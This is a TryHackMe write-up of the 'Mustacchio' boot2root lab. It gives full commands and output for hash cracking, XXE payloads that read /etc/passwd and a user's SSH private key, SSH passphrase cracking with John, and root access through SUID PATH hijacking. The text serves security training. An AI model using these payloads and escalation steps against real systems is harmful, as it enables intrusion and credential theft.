# Mustacchio — TryHackMe Writeup

**Room:** https://tryhackme.com/room/mustacchio
**Difficulty:** Easy
**Category:** Hash Cracking · XXE Injection · SSH Key Extraction · John the Ripper · SUID PATH Hijacking

> *"Easy boot2root machine."*

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{█████████████████████████████████████████}` |
| root.txt | `THM{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

### Nmap Scan — All Ports

```bash
nmap -sC -sV -p- -T4 --max-rate=1000 10.10.192.38 -oN nmap.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports: SSH on 22, Apache on 80, and **nginx on 8765** — that second HTTP port is unusual and worth immediate attention.

- **Port 80** — the main public-facing Mustacchio website
- **Port 8765** — a login panel (`Mustacchio | Login`)

---

## 2. Web Enumeration — Port 80

The public site is a static page. Directory scan:

```bash
gobuster dir -u http://10.10.192.38 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak
```

```
/images      (Status: 301)
/custom      (Status: 301)
/fonts       (Status: 301)
/index.html  (Status: 200)
```

`/custom` is interesting. Inside it:

```
/custom/js/
```

Navigating to `/custom/js/` shows a file: `users.bak` — a SQLite database backup.

---

## 3. Extracting Credentials from `users.bak`

Download the file:

```bash
wget http://10.10.192.38/custom/js/users.bak
```

Open it with SQLite:

```bash
sqlite3 users.bak
```

```sql
SQLite version 3.31.1
sqlite> .tables
users
sqlite> SELECT * FROM users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

- **Username:** `admin`
- **Password hash:** `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`

The hash length (40 hex chars) identifies it as **SHA-1**. Crack it with CrackStation or hashcat:

```bash
hashcat -m 100 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b /usr/share/wordlists/rockyou.txt
```

```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
```

**Credentials:**
- **Username:** `admin`
- **Password:** `bulldog19`

---

## 4. Admin Panel Login — Port 8765

Navigate to `http://10.10.192.38:8765/` and log in with `admin:bulldog19`. The dashboard presents a single input field labelled "Add a comment":

```
[         ] Submit
```

Typing a comment and submitting shows nothing visible. Viewing the page source reveals two critical hints:

```html
<!-- Barry, you can now SSH in using your key!-->
//document.cookie = "Example=/auth/dontforget.bak"
```

Two clues:
1. User `barry` has an SSH key configured
2. There is a file at `/auth/dontforget.bak`

---

## 5. Downloading `dontforget.bak` — XXE Template

```bash
curl http://10.10.192.38/auth/dontforget.bak
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>...</com>
</comment>
```

This is the expected XML structure the comment form parses. The comment field accepts XML. The fact that the source code left this template exposed — and the form processes user-submitted XML — is a clear signal for **XXE (XML External Entity) injection**.

---

## 6. XXE Injection — Reading Files

### Confirming XXE with `/etc/passwd`

Craft a payload using an external entity to read a local file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>test</name>
  <author>&xxe;</author>
  <com>test</com>
</comment>
```

Submit this in the comment field (via Burp Suite or the browser form). The response renders:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
barry:x:1000:1000:Barry,,,:/home/barry:/bin/bash
joe:x:1001:1001:Joe,,,:/home/joe:/bin/bash
```

XXE confirmed. User `barry` exists at `/home/barry/`.

### Extracting Barry's SSH Private Key

The page source said Barry can SSH using his key. The default SSH key path is `/home/barry/.ssh/id_rsa`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>test</name>
  <author>&xxe;</author>
  <com>test</com>
</comment>
```

The response returns the full private key. View the page source (not the rendered text) to preserve the line breaks accurately:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

[... base64 key data ...]
-----END RSA PRIVATE KEY-----
```

The `Proc-Type: 4,ENCRYPTED` header means the key is passphrase-protected.

---

## 7. Cracking the SSH Key Passphrase

Save the key to a file `barry_id_rsa` (ensure it has proper PEM line breaks every 64 characters). Convert it to a John-compatible hash:

```bash
ssh2john barry_id_rsa > barry_id_rsa.hash
john barry_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])

urieljames       (barry_id_rsa)
```

**SSH key passphrase:** `urieljames`

---

## 8. SSH Login as Barry & User Flag

```bash
chmod 600 barry_id_rsa
ssh -i barry_id_rsa barry@10.10.192.38
Enter passphrase for key 'barry_id_rsa': urieljames

barry@mustacchio:~$
```

```bash
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cat user.txt
```

**user.txt:** `THM{█████████████████████████████████████████}`

---

## 9. Privilege Escalation — SUID Binary + PATH Hijacking

Search for SUID binaries:

```bash
barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
...
/home/joe/live_log
...
```

An unusual SUID binary in `/home/joe/` stands out. Inspect it:

```bash
barry@mustacchio:~$ ls -la /home/joe/live_log
-rwsr-xr-x 1 root root 16832 Jun 12  2021 /home/joe/live_log
```

It's owned by root with the SUID bit set — executing it runs as root. Examine its strings:

```bash
barry@mustacchio:~$ strings /home/joe/live_log
```

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
...
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
```

The binary calls `tail` **without an absolute path** — it relies on `$PATH` to find it. If we inject a fake `tail` binary earlier in the PATH, it runs our code as root instead.

### Creating the Fake `tail` Binary

```bash
barry@mustacchio:~$ cd /tmp
barry@mustacchio:/tmp$ echo '/bin/bash' > tail
barry@mustacchio:/tmp$ chmod +x tail
```

### Prepend `/tmp` to PATH and Execute

```bash
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ /home/joe/live_log
```

```
root@mustacchio:/tmp# whoami
root
root@mustacchio:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell. Grab the flag:

```bash
root@mustacchio:/tmp# cat /root/root.txt
```

**root.txt:** `THM{█████████████████████████████████████████}`

---

## Key Learnings

- **Backup files expose database contents** — `users.bak` was a SQLite database sitting in a web-accessible JavaScript directory. Any `.bak`, `.sql`, `.db`, or `.sqlite` file in a web root is a direct credential leak. Always include backup extensions in gobuster scans.
- **SHA-1 without salting is trivially crackable** — `bulldog19` is in every major password database and cracked instantly by CrackStation. SHA-1 hashes without per-user salts offer no resistance to dictionary attacks against common passwords.
- **HTML source comments and JavaScript cookies reveal hidden endpoints** — both `<!-- Barry, you can now SSH in using your key! -->` and the commented-out `document.cookie` hint pointed directly to the attack path. Developers leaving breadcrumbs in source code is one of the most reliable recon techniques.
- **XXE on XML-parsing web forms is a file read primitive** — any application that parses user-submitted XML without disabling external entities is vulnerable. The `SYSTEM "file:///..."` entity syntax reads arbitrary local files. `/etc/passwd` confirms the bug; SSH private keys are the natural next target.
- **`ssh2john` + `john` breaks encrypted SSH keys** — an encrypted private key is not unconditionally safe. Converting it to a John hash and running `rockyou.txt` against it cracks weak passphrases in seconds.
- **SUID binaries calling commands without absolute paths are PATH-hijackable** — `strings` on a SUID binary surfaces every command it calls. Any command without a leading `/` is resolved from `$PATH`. Prepending a writable directory containing a fake binary of that name redirects the call to our code, running as root.

## Conclusion

Mustacchio chains five clean techniques into one compact room: backup file enumeration, SHA-1 hash cracking, XXE file read to extract an SSH key, SSH key passphrase cracking with John, and SUID binary PATH hijacking. No single step is particularly complex, but the chain requires reading every hint the application leaves — the source code comment, the JavaScript cookie hint, and the `strings` output of the SUID binary all point directly at the next step. The room is an excellent drill for the habit of reading everything before attacking anything.
